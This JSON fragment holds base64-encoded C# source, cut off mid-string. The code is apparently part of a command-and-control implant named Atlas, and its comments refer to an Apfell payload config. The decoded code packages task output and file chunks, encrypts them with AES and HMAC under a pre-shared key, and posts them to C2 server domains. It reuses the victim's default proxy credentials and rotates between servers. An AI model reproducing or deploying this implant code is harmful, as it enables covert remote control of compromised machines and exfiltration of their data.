IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gSm9iLmNodW5rX251bSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBKb2IuY2h1bmtzWzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IEpvYi5maWxlX2lkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBKb2IudGFza19pZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBKb2IuY2h1bmtfbnVtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gSm9iLmZpbGVfaWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zdFJlc3BvbnNlLnJlc3BvbnNlcy5BZGQoVGFza1Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmICgoSm9iLnRvdGFsX2NodW5rcyAhPSAwKSAmJiAoIUpvYi51cGxvYWQpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtfbnVtICE9IEpvYi50b3RhbF9jaHVua3MpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAiZmFsc2UiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGxfcGF0aCA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5UYXNrUmVzcG9uc2UgVGFza1Jlc3BvbnNlID0gbmV3IFV0aWxzLlRhc2tSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyX291dHB1dCA9IEpvYi5jaHVua3NbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAidHJ1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBudWxsLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc3RSZXNwb25zZS5yZXNwb25zZXMuQWRkKFRhc2tSZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlRhc2tSZXNwb25zZSBUYXNrUmVzcG9uc2UgPSBuZXcgVXRpbHMuVGFza1Jlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gSm9iLnRhc2tfaWQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJfb3V0cHV0ID0gSm9iLnJlc3BvbnNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSAidHJ1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVsbF9wYXRoID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gbnVsbCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmtfZGF0YSA9IG51bGwsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3N0UmVzcG9uc2UucmVzcG9uc2VzLkFkZChUYXNrUmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHN0cmluZyBEYXRhID0gVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgIGlmIChEYXRhLkNvbnRhaW5zKCJbXSIpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5VVUlEICsgVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIFNlcmlhbGl6ZWREYXRhID0gQ3J5cHRvLkVuY3J5cHQoVXRpbHMuUG9zdFJlc3BvbnNlLlRvSnNvbihQb3N0UmVzcG9uc2UpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBQb3N0KFNlcmlhbGl6ZWREYXRhKTsNCiNpZiBERUZBVUxUDQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhyZXN1bHQpKTsNCiNlbGlmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSkNCiAgICAgICAgICAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gQ3J5cHRvLkRlY3J5cHQocmVzdWx0KTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLlBvc3RSZXNwb25zZVJlc3BvbnNlIFBvc3RSZXNwb25zZVJlc3BvbnNlID0gVXRpbHMuUG9zdFJlc3BvbnNlUmVzcG9uc2UuRnJvbUpzb24oZmluYWxfcmVzdWx0LlN1YnN0cmluZygzNikpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLlJlc3BvbnNlIFJlc3BvbnNlIGluIFBvc3RSZXNwb25zZVJlc3BvbnNlLnJlc3BvbnNlcykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLkpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNvbXBsZXRlZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRhc2tfaWQgPT0gUmVzcG9uc2UudGFza19pZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChSZXNwb25zZS5zdGF0dXMgPT0gInN1Y2Nlc3MiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmRvd25sb2FkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuZmlsZV9pZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmZpbGVfaWQgPSBSZXNwb25zZS5maWxlX2lkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRvdGFsX2NodW5rcyA9PSBKb2IuY2h1bmtfbnVtKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtzLkNvdW50ICE9IDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5SZW1vdmVBdCgwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKChKb2IudG90YWxfY2h1bmtzICE9IDApICYgKCFKb2IudXBsb2FkKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSArIDEgIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuUmVtb3ZlQXQoMCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0rKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlJlbW92ZUpvYihKb2IsIEpvYkxpc3QpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KI2lmIChERUZBVUxUIHx8IERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXQoc3RyaW5nIEI2NERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgV2ViQ2xpZW50IGNsaWVudCA9IG5ldyBTeXN0ZW0uTmV0LldlYkNsaWVudCgpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5EZWZhdWx0UHJveHkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gV2ViUmVxdWVzdC5EZWZhdWx0V2ViUHJveHk7DQogICAgICAgICAgICAgICAgY2xpZW50LlVzZURlZmF1bHRDcmVkZW50aWFscyA9IHRydWU7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdlYlByb3h5IHByb3h5ID0gbmV3IFdlYlByb3h5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBBZGRyZXNzID0gbmV3IFVyaShDb25maWcuUHJveHlBZGRyZXNzKSwNCiAgICAgICAgICAgICAgICAgICAgVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIENyZWRlbnRpYWxzID0gbmV3IE5ldHdvcmtDcmVkZW50aWFsKENvbmZpZy5Qcm94eVVzZXIsIENvbmZpZy5Qcm94eVBhc3N3b3JkKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gcHJveHk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCBDb25maWcuVXNlckFnZW50KTsNCiAgICAgICAgICAgIGNsaWVudC5RdWVyeVN0cmluZy5BZGQoQ29uZmlnLlBhcmFtLCBCNjREYXRhLlJlcGxhY2UoIisiLCAiJTJCIikuUmVwbGFjZSgiLyIsICIlMkYiKS5SZXBsYWNlKCI9IiwgIiUzRCIpLlJlcGxhY2UoIlxuIiwgIiUwQSIpKTsNCiAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzID0gQ29uZmlnLlNlcnZlcnMuT3JkZXJCeShzPT5zLmNvdW50KS5Ub0xpc3QoKTsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJlc3VsdCA9IGNsaWVudC5Eb3dubG9hZFN0cmluZyhDb25maWcuU2VydmVyc1swXS5kb21haW4gKyBDb25maWcuVXJsKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWcuU2VydmVyc1swXS5jb3VudCsrOyANCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUG9zdChzdHJpbmcgQjY0RGF0YSkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIHJlc3VsdCA9IG51bGw7DQogICAgICAgICAgICBXZWJDbGllbnQgY2xpZW50ID0gbmV3IFN5c3RlbS5OZXQuV2ViQ2xpZW50KCk7DQogICAgICAgICAgICBpZiAoQ29uZmlnLkRlZmF1bHRQcm94eSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjbGllbnQuUHJveHkgPSBXZWJSZXF1ZXN0LkRlZmF1bHRXZWJQcm94eTsNCiAgICAgICAgICAgICAgICBjbGllbnQuVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICBjbGllbnQuUHJveHkuQ3JlZGVudGlhbHMgPSBDcmVkZW50aWFsQ2FjaGUuRGVmYXVsdE5ldHdvcmtDcmVkZW50aWFsczsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBXZWJQcm94eSBwcm94eSA9IG5ldyBXZWJQcm94eQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgQWRkcmVzcyA9IG5ldyBVcmkoQ29uZmlnLlByb3h5QWRkcmVzcyksDQogICAgICAgICAgICAgICAgICAgIFVzZURlZmF1bHRDcmVkZW50aWFscyA9IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICBDcmVkZW50aWFscyA9IG5ldyBOZXR3b3JrQ3JlZGVudGlhbChDb25maWcuUHJveHlVc2VyLCBDb25maWcuUHJveHlQYXNzd29yZCkNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIGNsaWVudC5Qcm94eSA9IHByb3h5Ow0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2xpZW50LkhlYWRlcnMuQWRkKCJVc2VyLUFnZW50IiwgQ29uZmlnLlVzZXJBZ2VudCk7DQogICAgICAgICAgICBDb25maWcuU2VydmVycyA9IENvbmZpZy5TZXJ2ZXJzLk9yZGVyQnkocyA9PiBzLmNvdW50KS5Ub0xpc3QoKTsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJlc3VsdCA9IGNsaWVudC5VcGxvYWRTdHJpbmcoQ29uZmlnLlNlcnZlcnNbMF0uZG9tYWluICsgQ29uZmlnLlVybCwgQjY0RGF0YSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlnLlNlcnZlcnNbMF0uY291bnQrKzsNCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQojZW5kaWYNCiAgICB9DQp9DQo="
        },
        {
          "Crypto.cs": "77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Ow0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLkxpbnE7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIGNsYXNzIENyeXB0bw0KICAgIHsNCiNpZiAoREVGQVVMVF9FS0UgfHwgSFRUUF9FS0UpDQogICAgICAgIC8vLyA8c3VtbWFyeT4NCiAgICAgICAgLy8vIEVuY3J5cHQgYW55IGdpdmVuIHBsYWludGV4dCB3aXRoIHRoZSBQU0sgZ2l2ZW4NCiAgICAgICAgLy8vIHRvIHRoZSBhZ2VudC4NCiAgICAgICAgLy8vIDwvc3VtbWFyeT4NCiAgICAgICAgLy8vIDxwYXJhbSBuYW1lPSJwbGFpbnRleHQiPlBsYWludGV4dCB0byBlbmNyeXB0LjwvcGFyYW0+DQogICAgICAgIC8vLyA8cmV0dXJucz5FbnJ5cHRlZCBzdHJpbmcuPC9yZXR1cm5zPg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBFbmNyeXB0U3RhZ2Uoc3RyaW5nIHBsYWludGV4dCkNCiAgICAgICAgew0KICAgICAgICAgICAgdXNpbmcgKEFlcyBhZXMgPSBBZXMuQ3JlYXRlKCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gVXNlIG91ciBQU0sgKGdlbmVyYXRlZCBpbiBBcGZlbGwgcGF5bG9hZCBjb25maWcpIGFzIHRoZSBBRVMga2V5DQogICAgICAgICAgICAgICAgYWVzLktleSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhDb25maWcuUHNrKTsNCiAgICAgICAgICAgICAgICBhZXMuUGFkZGluZyA9IFBhZGRpbmdNb2RlLlBLQ1M3Ow0KICAgICAgICAgICAgICAgIElDcnlwdG9UcmFuc2Zvcm0gZW5jcnlwdG9yID0gYWVzLkNyZWF0ZUVuY3J5cHRvcihhZXMuS2V5LCBhZXMuSVYpOw0KDQogICAgICAgICAgICAgICAgdXNpbmcgKE1lbW9yeVN0cmVhbSBlbmNyeXB0TWVtU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhbSgpKQ0KICAgICAgICAgICAgICAgIHVzaW5nIChDcnlwdG9TdHJlYW0gZW5jcnlwdENyeXB0b1N0cmVhbSA9IG5ldyBDcnlwdG9TdHJlYW0oZW5jcnlwdE1lbVN0cmVhbSwgZW5jcnlwdG9yLCBDcnlwdG9TdHJlYW1Nb2RlLldyaXRlKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHVzaW5nIChTdHJlYW1Xcml0ZXIgZW5jcnlwdFN0cmVhbVdyaXRlciA9IG5ldyBTdHJlYW1Xcml0ZXIoZW5jcnlwdENyeXB0b1N0cmVhbSkpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0U3RyZWFtV3JpdGVyLldyaXRlKHBsYWludGV4dCk7DQogICAgICAgICAgICAgICAgICAgIC8vIFdlIG5lZWQgdG8gc2VuZCB1dWlkOml2OmNpcGhlcnRleHQ6aG1hYw0KICAgICAgICAgICAgICAgICAgICAvLyBDb25jYXQgaXY6Y2lwaGVydGV4dA0KICAgICAgICAgICAgICAgICAgICBieXRlW10gZW5jcnlwdGVkID0gYWVzLklWLkNvbmNhdChlbmNyeXB0TWVtU3RyZWFtLlRvQXJyYXkoKSkuVG9BcnJheSgpOw0KICAgICAgICAgICAgICAgICAgICBITUFDU0hBMjU2IHNoYTI1NiA9IG5ldyBITUFDU0hBMjU2KENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhDb25maWcuUHNrKSk7DQogICAgICAgICAgICAgICAgICAgIC8vIEF0dGFjaCBobWFjIHRvIGl2OmNpcGhlcnRleHQNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGhtYWMgPSBzaGEyNTYuQ29tcHV0ZUhhc2goZW5jcnlwdGVkKTsNCiAgICAgICAgICAgICAgICAgICAgLy8gQXR0YWNoIHV1aWQgdG8gaXY6Y2lwaGVydGV4dDpobWFjDQogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBmaW5hbCA9IEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoQ29uZmlnLlBheWxvYWRVVUlEKS5Db25jYXQoZW5jcnlwdGVkLkNvbmNhdChobWFjKS5Ub0FycmF5KCkpLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICAgICAgLy8gUmV0dXJuIGJhc2U2NCBlbmNvZGVkIGNpcGhlcnRleHQNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoZmluYWwpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KI2VuZGlmIA0KI2lmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSB8fCBIVFRQX1BTSyB8fCBIVFRQX0VLRSkNCiAgICAgICAgLy8vIDxzdW1tYXJ5Pg0KICAgICAgICAvLy8gRW5jcnlwdCBhbnkgZ2l2ZW4gcGxhaW50ZXh0IHdpdGggdGhlIFBTSyBnaXZlbg0KICAgICAgICAvLy8gdG8gdGhlIGFnZW50Lg0KICAgICAgICAvLy8gPC9zdW1tYXJ5Pg0KICAgICAgICAvLy8gPHBhcmFtIG5hbWU9InBsYWludGV4dCI+UGxhaW50ZXh0IHRvIGVuY3J5cHQuPC9wYXJhbT4NCiAgICAgICAgLy8vIDxyZXR1cm5zPkVucnlwdGVkIHN0cmluZy48L3JldHVybnM+DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEVuY3J5cHRDaGVja2luKHN0cmluZyBwbGFpbnRleHQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHVzaW5nIChBZXMgYWVzID0gQWVzLkNyZWF0ZSgpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vIFVzZSBvdXIgUFNLIChnZW5lcmF0ZWQgaW4gQXBmZWxsIHBheWxvYWQgY29uZmlnKSBhcyB0aGUgQUVTIGtleQ0KICAgICAgICAgICAgICAgIGFlcy5LZXkgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQ29uZmlnLlBzayk7DQogICAgICAgICAgICAgICAgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsNCiAgICAgICAgICAgICAgICBJQ3J5cHRvVHJhbnNmb3JtIGVuY3J5cHRvciA9IGFlcy5DcmVhdGVFbmNyeXB0b3IoYWVzLktleSwgYWVzLk